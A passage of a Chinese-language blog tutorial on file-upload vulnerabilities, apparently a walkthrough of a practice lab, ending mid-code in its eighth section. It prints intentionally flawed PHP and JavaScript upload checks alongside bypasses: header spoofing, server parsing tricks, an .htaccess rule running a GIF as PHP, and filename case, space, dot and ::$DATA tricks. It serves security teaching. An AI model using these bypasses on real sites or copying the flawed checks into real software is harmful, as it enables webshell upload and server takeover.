        <content type="html"><![CDATA[<excerpt in index> <ul><li><a id="more"></a><the rest of contents文></the></li></ul><h1 id="上传漏洞"><a href="#上传漏洞" class="headerlink" title="上传漏洞"></a><a href="https://baike.baidu.com/item/%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/11003736?fr=aladdin" target="_blank" rel="noopener">上传漏洞</a></h1><p>这个<a href="https://baike.baidu.com/item/%E6%BC%8F%E6%B4%9E/1688129" target="_blank" rel="noopener">漏洞</a>在DVBBS6.0时代被<a href="https://baike.baidu.com/item/%E9%BB%91%E5%AE%A2" target="_blank" rel="noopener">黑客</a>们利用的最为<a href="https://baike.baidu.com/item/%E7%8C%96%E7%8D%97/10714122" target="_blank" rel="noopener">猖獗</a>，利用上传漏洞可以直接得到<a href="https://baike.baidu.com/item/WEBSHELL" target="_blank" rel="noopener">WEBSHELL</a>，危害等级超级高，现在的入侵中上传漏洞也是常见的漏洞。</p><p>导致该漏洞的原因在于代码作者没有对访客提交的数据进行检验或者过滤不严，可以直接提交修改过的数据绕过扩展名的检验。</p><hr><h2 id="1，前端验证绕过"><a href="#1，前端验证绕过" class="headerlink" title="1，前端验证绕过"></a>1，前端验证绕过</h2><p>当用户在客户端选择文件点击上传的时候，客户端还没有向服务器发送任何消息，就对本地文件进行检测来判断是否是可以上传的类型，这种方式称为前台脚本检测扩展名。</p><h3 id="附上源码："><a href="#附上源码：" class="headerlink" title="附上源码："></a>附上源码：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">function checkFile() &#123;</span><br><span class="line">    var file = document.getElementsByName(&apos;upload_file&apos;)[0].value;</span><br><span class="line">    if (file == null || file == &quot;&quot;) &#123;</span><br><span class="line">        alert(&quot;请选择要上传的文件!&quot;);</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line">    //定义允许上传的文件类型</span><br><span class="line">    var allow_ext = &quot;.jpg|.png|.gif&quot;;</span><br><span class="line">    //提取上传文件的类型</span><br><span class="line">    var ext_name = file.substring(file.lastIndexOf(&quot;.&quot;));</span><br><span class="line">    //判断上传文件类型是否允许上传</span><br><span class="line">    if (allow_ext.indexOf(ext_name + &quot;|&quot;) == -1) &#123;</span><br><span class="line">        var errMsg = &quot;该文件不允许上传，请上传&quot; + allow_ext + &quot;类型的文件,当前文件类型为：&quot; + ext_name;</span><br><span class="line">        alert(errMsg);</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>既然是前端验证那么只要随便的编辑一下页面/用burpsuite/写个小脚本就可以突破。</p><h2 id="2，Content-Type方式绕过"><a href="#2，Content-Type方式绕过" class="headerlink" title="2，Content-Type方式绕过"></a>2，Content-Type方式绕过</h2><p>HTTP协议规定了上传资源的时候在Header中加上一项文件的MIMETYPE，来识别文件类型，这个动作是由浏览器完成的，服务端可以检查此类型不过这仍然是不安全的,因为HTTP header可以被发出者或者中间人任意的修改，不过加上一层防护也是可以有一定效果的</p><h3 id="附上源码：-1"><a href="#附上源码：-1" class="headerlink" title="附上源码："></a>附上源码：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = false;</span><br><span class="line">$msg = null;</span><br><span class="line">if (isset($_POST[&apos;submit&apos;])) &#123;</span><br><span class="line">    if (file_exists($UPLOAD_ADDR)) &#123;</span><br><span class="line">        if (($_FILES[&apos;upload_file&apos;][&apos;type&apos;] == &apos;image/jpeg&apos;) || ($_FILES[&apos;upload_file&apos;][&apos;type&apos;] == &apos;image/png&apos;) || ($_FILES[&apos;upload_file&apos;][&apos;type&apos;] == &apos;image/gif&apos;)) &#123;</span><br><span class="line">            if (move_uploaded_file($_FILES[&apos;upload_file&apos;][&apos;tmp_name&apos;], $UPLOAD_ADDR . &apos;/&apos; . $_FILES[&apos;upload_file&apos;][&apos;name&apos;])) &#123;</span><br><span class="line">                $img_path = $UPLOAD_ADDR . $_FILES[&apos;upload_file&apos;][&apos;name&apos;];</span><br><span class="line">                $is_upload = true;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $msg = &apos;文件类型不正确，请重新上传！&apos;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $msg = $UPLOAD_ADDR.&apos;文件夹不存在,请手工创建！&apos;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="方法："><a href="#方法：" class="headerlink" title="方法："></a>方法：</h3><p>使用各种各样的工具（如burpsuite）强行篡改Header就可以，太容易将header中的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Type: application/php</span><br></pre></td></tr></table></figure><p>或者其他类型</p><p>改为</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Content-Type: image/jpg</span><br><span class="line">Content-Type: image/png</span><br><span class="line">Content-Type: text/plain</span><br></pre></td></tr></table></figure><h2 id="3，黑名单绕过"><a href="#3，黑名单绕过" class="headerlink" title="3，黑名单绕过"></a>3，黑名单绕过</h2><p>就是在文件被上传到服务端的时候，对于文件名的扩展名进行检查，如果不合法，则拒绝这次上传</p><h3 id="附上源码：-2"><a href="#附上源码：-2" class="headerlink" title="附上源码："></a>附上源码：</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists($UPLOAD_ADDR)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">'.asp'</span>,<span class="string">'.aspx'</span>,<span class="string">'.php'</span>,<span class="string">'.jsp'</span>);</span><br><span class="line">        $file_name = trim($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]);</span><br><span class="line">        $file_name = deldot($file_name);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">'.'</span>);</span><br><span class="line">        $file_ext = strtolower($file_ext); <span class="comment">//转换为小写</span></span><br><span class="line">        $file_ext = str_ireplace(<span class="string">'::$DATA'</span>, <span class="string">''</span>, $file_ext);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        $file_ext = trim($file_ext); <span class="comment">//收尾去空</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>], $UPLOAD_ADDR. <span class="string">'/'</span> . $_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>])) &#123;</span><br><span class="line">                 $img_path = $UPLOAD_ADDR .<span class="string">'/'</span>. $_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>];</span><br><span class="line">                 $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">'不允许上传.asp,.aspx,.php,.jsp后缀文件！'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = $UPLOAD_ADDR . <span class="string">'文件夹不存在,请手工创建！'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>方法:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">老版本的IIS中的目录解析漏洞，如果网站目录中有一个 /.asp/目录，那么此目录下面的一切内容都会被当作asp脚本来解析</span><br><span class="line">老板本的IIS中的分号漏洞：IIS在解析文件名的时候可能将分号后面的内容丢弃，那么我们可以在上传的时候给后面加入分号内容来避免黑名单过滤，如 a.asp;jpg</span><br><span class="line">旧版Windows Server中存在空格和dot漏洞类似于 a.php. 和 a.php[空格] 这样的文件名存储后会被windows去掉点和空格，从而使得加上这两个东西可以突破过滤，成功上传，并且被当作php代码来执行</span><br><span class="line">nginx空字节漏洞 xxx.jpg%00.php 这样的文件名会被解析为php代码运行</span><br><span class="line">apache的解析漏洞，上传如a.php.rar a.php.gif 类型的文件名，可以避免对于php文件的过滤机制，但是由于apache在解析文件名的时候是从右向左读，如果遇到不能识别的扩展名则跳过，rar等扩展名是apache不能识别的，因此就会直接将类型识别为php，从而达到了注入php代码的目的</span><br></pre></td></tr></table></figure><h2 id="4，-htaccess文件绕过（重写解析规则—绕过）"><a href="#4，-htaccess文件绕过（重写解析规则—绕过）" class="headerlink" title="4，.htaccess文件绕过（重写解析规则—绕过）"></a>4，.htaccess文件绕过（<strong>重写解析规则—绕过</strong>）</h2><p>上传覆盖.htaccess文件，重写解析规则，将上传的带有脚本马的图片以脚本方式解析。</p><h3 id="附上源码：-3"><a href="#附上源码：-3" class="headerlink" title="附上源码："></a>附上源码：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = false;</span><br><span class="line">$msg = null;</span><br><span class="line">if (isset($_POST[&apos;submit&apos;])) &#123;</span><br><span class="line">    if (file_exists($UPLOAD_ADDR)) &#123;</span><br><span class="line">        $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;php1&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;pHp1&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;);</span><br><span class="line">        $file_name = trim($_FILES[&apos;upload_file&apos;][&apos;name&apos;]);</span><br><span class="line">        $file_name = deldot($file_name);//删除文件名末尾的点</span><br><span class="line">        $file_ext = strrchr($file_name, &apos;.&apos;);</span><br><span class="line">        $file_ext = strtolower($file_ext); //转换为小写</span><br><span class="line">        $file_ext = str_ireplace(&apos;::$DATA&apos;, &apos;&apos;, $file_ext);//去除字符串::$DATA</span><br><span class="line">        $file_ext = trim($file_ext); //收尾去空</span><br><span class="line"></span><br><span class="line">        if (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            if (move_uploaded_file($_FILES[&apos;upload_file&apos;][&apos;tmp_name&apos;], $UPLOAD_ADDR . &apos;/&apos; . $_FILES[&apos;upload_file&apos;][&apos;name&apos;])) &#123;</span><br><span class="line">                $img_path = $UPLOAD_ADDR . $_FILES[&apos;upload_file&apos;][&apos;name&apos;];</span><br><span class="line">                $is_upload = true;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $msg = &apos;此文件不允许上传!&apos;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $msg = $UPLOAD_ADDR . &apos;文件夹不存在,请手工创建！&apos;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>方法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">在可以上传.htaccess文件时，先上传.htaccess文件，覆盖掉原先的.htaccess文件；再上传【evil.gif】文件。使用如下的.htaccess语句，即可将【evil.gif】文件以php脚本方式解析。</span><br><span class="line">&lt;FilesMatch &quot;evil.gif&quot;&gt;</span><br><span class="line"></span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure><h2 id="5，后缀大小写绕过"><a href="#5，后缀大小写绕过" class="headerlink" title="5，后缀大小写绕过"></a>5，后缀大小写绕过</h2><h3 id="附上源码：-4"><a href="#附上源码：-4" class="headerlink" title="附上源码："></a>附上源码：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = false;</span><br><span class="line">$msg = null;</span><br><span class="line">if (isset($_POST[&apos;submit&apos;])) &#123;</span><br><span class="line">    if (file_exists($UPLOAD_ADDR)) &#123;</span><br><span class="line">        $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;);</span><br><span class="line">        $file_name = trim($_FILES[&apos;upload_file&apos;][&apos;name&apos;]);</span><br><span class="line">        $file_name = deldot($file_name);//删除文件名末尾的点</span><br><span class="line">        $file_ext = strrchr($file_name, &apos;.&apos;);</span><br><span class="line">        $file_ext = str_ireplace(&apos;::$DATA&apos;, &apos;&apos;, $file_ext);//去除字符串::$DATA</span><br><span class="line">        $file_ext = trim($file_ext); //首尾去空</span><br><span class="line"></span><br><span class="line">        if (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            if (move_uploaded_file($_FILES[&apos;upload_file&apos;][&apos;tmp_name&apos;], $UPLOAD_ADDR . &apos;/&apos; . $_FILES[&apos;upload_file&apos;][&apos;name&apos;])) &#123;</span><br><span class="line">                $img_path = $UPLOAD_ADDR . &apos;/&apos; . $file_name;</span><br><span class="line">                $is_upload = true;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $msg = &apos;此文件不允许上传&apos;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $msg = $UPLOAD_ADDR . &apos;文件夹不存在,请手工创建！&apos;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="方法：-1"><a href="#方法：-1" class="headerlink" title="方法："></a>方法：</h3><p>将Burpsuite截获的数据包中的文件名【evil.php】改为【evil.Php】</p><h2 id="6，文件后缀（空）绕过"><a href="#6，文件后缀（空）绕过" class="headerlink" title="6，文件后缀（空）绕过"></a>6，文件后缀（空）绕过</h2><h3 id="附上源码：-5"><a href="#附上源码：-5" class="headerlink" title="附上源码："></a>附上源码：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = false;</span><br><span class="line">$msg = null;</span><br><span class="line">if (isset($_POST[&apos;submit&apos;])) &#123;</span><br><span class="line">    if (file_exists($UPLOAD_ADDR)) &#123;</span><br><span class="line">        $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;);</span><br><span class="line">        $file_name = $_FILES[&apos;upload_file&apos;][&apos;name&apos;];</span><br><span class="line">        $file_name = deldot($file_name);//删除文件名末尾的点</span><br><span class="line">        $file_ext = strrchr($file_name, &apos;.&apos;);</span><br><span class="line">        $file_ext = strtolower($file_ext); //转换为小写</span><br><span class="line">        $file_ext = str_ireplace(&apos;::$DATA&apos;, &apos;&apos;, $file_ext);//去除字符串::$DATA</span><br><span class="line">        </span><br><span class="line">        if (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            if (move_uploaded_file($_FILES[&apos;upload_file&apos;][&apos;tmp_name&apos;], $UPLOAD_ADDR . &apos;/&apos; . $_FILES[&apos;upload_file&apos;][&apos;name&apos;])) &#123;</span><br><span class="line">                $img_path = $UPLOAD_ADDR . &apos;/&apos; . $file_name;</span><br><span class="line">                $is_upload = true;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $msg = &apos;此文件不允许上传&apos;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $msg = $UPLOAD_ADDR . &apos;文件夹不存在,请手工创建！&apos;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="方法：-2"><a href="#方法：-2" class="headerlink" title="方法："></a>方法：</h3><p>在burpsuite中抓包，在后缀加上空格即可</p><h2 id="7，文件后缀-点-绕过"><a href="#7，文件后缀-点-绕过" class="headerlink" title="7，文件后缀(点)绕过"></a>7，文件后缀(点)绕过</h2><h3 id="附上源码：-6"><a href="#附上源码：-6" class="headerlink" title="附上源码："></a>附上源码：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = false;</span><br><span class="line">$msg = null;</span><br><span class="line">if (isset($_POST[&apos;submit&apos;])) &#123;</span><br><span class="line">    if (file_exists($UPLOAD_ADDR)) &#123;</span><br><span class="line">        $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;);</span><br><span class="line">        $file_name = trim($_FILES[&apos;upload_file&apos;][&apos;name&apos;]);</span><br><span class="line">        $file_ext = strrchr($file_name, &apos;.&apos;);</span><br><span class="line">        $file_ext = strtolower($file_ext); //转换为小写</span><br><span class="line">        $file_ext = str_ireplace(&apos;::$DATA&apos;, &apos;&apos;, $file_ext);//去除字符串::$DATA</span><br><span class="line">        $file_ext = trim($file_ext); //首尾去空</span><br><span class="line">        </span><br><span class="line">        if (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            if (move_uploaded_file($_FILES[&apos;upload_file&apos;][&apos;tmp_name&apos;], $UPLOAD_ADDR . &apos;/&apos; . $_FILES[&apos;upload_file&apos;][&apos;name&apos;])) &#123;</span><br><span class="line">                $img_path = $UPLOAD_ADDR . &apos;/&apos; . $file_name;</span><br><span class="line">                $is_upload = true;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $msg = &apos;此文件不允许上传&apos;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $msg = $UPLOAD_ADDR . &apos;文件夹不存在,请手工创建！&apos;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="方法：-3"><a href="#方法：-3" class="headerlink" title="方法："></a>方法：</h3><p>在burpsuite中抓包，在后缀加上一个点（’.’）即可</p><h2 id="8，-DATA（Windows文件流绕过）"><a href="#8，-DATA（Windows文件流绕过）" class="headerlink" title="8，::$DATA（Windows文件流绕过）"></a>8，::$DATA（Windows文件流绕过）</h2><p>这道题利用的是Windows下NTFS文件系统的一个特性，即NTFS文件系统的存储数据流的一个属性 DATA。当我们访问a.asp::DATA时，就是请求 a.asp 本身的数据，如果a.asp 还包含了其他的数据流，比如 a.asp:2.asp，请求 a.asp:2.asp::$DATA，则是请求a.asp中的流数据2.asp的流数据内容。</p><h3 id="附上源码：-7"><a href="#附上源码：-7" class="headerlink" title="附上源码："></a>附上源码：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = false;</span><br><span class="line">$msg = null;</span><br><span class="line">if (isset($_POST[&apos;submit&apos;])) &#123;</span><br><span class="line">    if (file_exists($UPLOAD_ADDR)) &#123;</span><br><span class="line">        $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;);</span><br><span class="line">        $file_name = trim($_FILES[&apos;upload_file&apos;][&apos;name&apos;]);</span><br><span class="line">        $file_name = deldot($file_name);//删除文件名末尾的点</span><br><span class="line">        $file_ext = strrchr($file_name, &apos;.&apos;);</span><br><span class="line">        $file_ext = strtolower($file_ext); //转换为小写</span><br><span class="line">        $file_ext = trim($file_ext); //首尾去空</span><br><span class="line">        </span><br><span class="line">        if (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            if (move_uploaded_file($_FILES[&apos;upload_file&apos;][&apos;tmp_name&apos;], $UPLOAD_ADDR . &apos;/&apos; . $_FILES[&apos;upload_file&apos;][&apos;name&apos;])) &#123;</span><br><span class="line">                $img_path = $UPLOAD_ADDR . &apos;/&apos; . $file_name;</span><br><span class="line">                $is_upload = true;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $msg = &apos;此文件不允许上传&apos;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $msg = $UPLOAD_ADDR . &apos;文件夹不存在,请手工创建！&apos;;</span><br><span 